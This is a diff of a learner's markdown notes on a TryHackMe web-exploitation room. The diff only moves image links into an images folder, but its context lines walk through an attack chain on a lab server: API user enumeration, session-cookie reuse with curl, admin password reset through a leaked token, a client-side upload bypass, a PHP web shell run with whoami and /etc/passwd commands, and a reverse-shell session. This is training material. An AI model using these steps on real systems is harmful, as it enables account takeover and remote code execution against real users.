@@ -159,7 +159,7 @@ The API helpfully lists its own endpoints. This is already an information disc
 
 so for t his, the command is “curl http://<targ IP>/api/   and the output is “{"endpoints":["\/api\/user","\/api\/jobs","\/api\/applications"]}”. also, it matters whether it’s “/api/” or with no slash “api” the two different commands give two different results.
 
-![image.png](image.png)
+![image.png](images/image.png)
 
 Answer the questions below
 
@@ -205,7 +205,7 @@ we test it out. change the 6 to a 1. we can either do this in the web browser it
 
 this is using curl:
 
-![image.png](image%201.png)
+![image.png](images/image%201.png)
 
 **Extracting Cookies**
 
@@ -219,11 +219,11 @@ first, right-click on page
 
 click “inspect” → Storage → Cookies, Select target IP → look for SESSION COOKIE
 
-![image.png](image%202.png)
+![image.png](images/image%202.png)
 
-![image.png](image%203.png)
+![image.png](images/image%203.png)
 
-![image.png](image%204.png)
+![image.png](images/image%204.png)
 
 Go to the `Storage` tab, then expand `Cookies` and select `http://MACHINE_IP`. You’ll see all cookies listed, look for the `PHPSESSID` cookie and copy its value.
 
@@ -237,7 +237,7 @@ Let's also use `curl` so we can see exactly what comes back. Make sure to incl
 
 we use ‘curl’ with the session cookie i just got:
 
-![image.png](image%205.png)
+![image.png](images/image%205.png)
 
 curl -s -b "PHPSESSID=es3iujv1hq33dme337qfhj2l71" "[http://10.145.158.140/profile.php?id=1](http://10.145.158.140/profile.php?id=1)" | grep "fw-semibold"
 <div class="fw-semibold mt-1">Sarah Mitchell</div>
@@ -246,7 +246,7 @@ curl -s -b "PHPSESSID=es3iujv1hq33dme337qfhj2l71" "[http://10.145.158.140/profil
 
 curl -s -b "PHPSESSID=es3iujv1hq33dme337qfhj2l71" "[http://10.145.158.140/profile.php?id=1](http://10.145.158.140/profile.php?id=1)" | grep "fw-semibold"
 
-![image.png](image%206.png)
+![image.png](images/image%206.png)
 
 Terminal
 
@@ -273,7 +273,7 @@ root@tryhackme:~# curl -s "http://MACHINE_IP/api/user?id=1"
 {"id":2,"name":"James Crawford","email":"j.crawford@recruitx.thm","role":"hiring_manager","created":"2026-03-24"}
 ```
 
-![image.png](image%207.png)
+![image.png](images/image%207.png)
 
 The API is even more revealing than the web page. It returns structured JSON with the user's name, email, role, and account creation date. By incrementing the `id` parameter from 1 through 5, we can enumerate every user in the system.
 
@@ -305,11 +305,11 @@ we know the admin is “`s.mitchell@recruitx.thm"` . the next step is taking ove
 
 Navigate to `http://MACHINE_IP/reset.php`. You will see a simple form asking for an email address. Let's first test the flow with our own account to understand how it works. Enter `testuser@fake.thm` and submit the form.
 
-![image.png](image%208.png)
+![image.png](images/image%208.png)
 
 This is our first major finding. In a properly designed application, the reset token would be sent to the user's email and would never be displayed on screen. But this application shows the token directly in the response. While this alone would let us reset our own password, the real question is: How is the token being shared with the user?
 
-![image.png](image%209.png)
+![image.png](images/image%209.png)
 
 ## **Analysing the Token**
 
@@ -325,7 +325,7 @@ The tokens are six-digit numbers. They appear random, but the range is limited; 
 
 the Token are 6 digits. they’res a set amount of them. but values are random probably. we’ll know attempt the ‘reset password’ button the web page, and use ‘s.mitchell@recruitx.thm’, who’s an admin.
 
-![image.png](image%2010.png)
+![image.png](images/image%2010.png)
 
 ![Reset Password form after submitting the request.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1774716594058.png)
 
@@ -337,7 +337,7 @@ We now have everything we need. Let's use the token to reset Sarah Mitchell's pa
 
 use the token to reset s.mitchell’s password.
 
-![image.png](image%2011.png)
+![image.png](images/image%2011.png)
 
 it goes through. you can see the “Password has been reset successfully” changed password too: Password123
 
@@ -385,7 +385,7 @@ this says you can inspect the ‘client-side code’ of the upload page, by  rig
 
 We can notice several important details. The form says it accepts PDF, DOCX, and image files. The `accept` attribute on the file input restricts file types, but this is a *client-side* restriction only. The browser enforces it, but a direct HTTP request can send whatever file type it wants. The page also reveals the upload destination: `/uploads/documents/`.
 
-![image.png](image%2012.png)
+![image.png](images/image%2012.png)
 
 right-clicking the upload button, and Inspect, i can see ‘form action’, and then div class, when i open that ip, i get ‘input class’, and it says the type is file, the name is document, and it accepts ‘.pdf’, ‘.docx,.jpg,.png” required.  and, these restrictions are “client-side” restriction only, so, the browser will enforce it, but a direct HTTP request can send any file type it wants. this page also reveals ‘/uploads/documents/’.
 
@@ -403,7 +403,7 @@ root@tryhackme:~# echo "This is a test file" > test.txt
 
 this had echo output that string, and it’s redirected to file ‘test.txt’, which was creaated during the command, not already created before this command
 
-![image.png](image%2013.png)
+![image.png](images/image%2013.png)
 
 Once the file is created, upload it to the admin panel. Open the upload page, right-click on the file input, and select Inspect. In the HTML, remove the accept attribute by deleting it (backspace) so the browser no longer restricts file types. Now select and upload your file directly, bypassing the client-side restriction.
 
@@ -451,7 +451,7 @@ Let's verify that our uploaded file executes by visiting the page `http://MACHI
 
 ![PHP file uploaded and executing on the server.](https://tryhackme-images.s3.amazonaws.com/user-uploads/691e303c8bb7e99b93a58132/room-content/691e303c8bb7e99b93a58132-1774773894691.png)
 
-![image.png](image%2014.png)
+![image.png](images/image%2014.png)
 
 when we got a file to successfully upload, it gave a success message, and in it, told me the PATH to the uploade file. in the browser, i type in that path, and the page i get to is “PHP is executing”.
 
@@ -502,9 +502,9 @@ root@tryhackme:~# curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=whoa
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
 ```
 
-![image.png](image%2015.png)
+![image.png](images/image%2015.png)
 
-![image.png](image%2016.png)
+![image.png](images/image%2016.png)
 
 We have remote code execution. The commands are running as `www-data`, which is the default user for the Apache web server on Ubuntu. Let's gather more information about the system:
 
@@ -521,7 +521,7 @@ root@tryhackme:~# curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=host
 
 We can now see the hostname, kernel version, and execute any command on the system.
 
-![image.png](image%2017.png)
+![image.png](images/image%2017.png)
 
 can’t see hostname but can see other
 
@@ -551,7 +551,7 @@ mysql:x:115:123:MySQL Server,,,:/nonexistent:/bin/false
 </pre>
 ```
 
-![image.png](image%2018.png)
+![image.png](images/image%2018.png)
 
 By utilising our web shell, we accessed `/etc/passwd` and identified system users. In a real-world scenario, this level of access would enable further enumeration of configuration files to extract database credentials and gain full access to the application's backend data.
 
@@ -597,7 +597,7 @@ Connection received on CONNECTION_IP 48268www-data@example-hostame:/var/www/html
 www-datawww-data@example-hostame:/var/www/uploads/documents$
 ```
 
-![image.png](image%2019.png)
+![image.png](images/image%2019.png)
 
 We now have an interactive shell on the target server. From here, a penetration tester would typically proceed to local enumeration and privilege escalation, but that is beyond the scope of this room.
 
@@ -626,7 +626,7 @@ What is the flag?
 
 Check
 
-![image.png](image%2020.png)
+![image.png](images/image%2020.png)
 
 —The Attack Chain
 
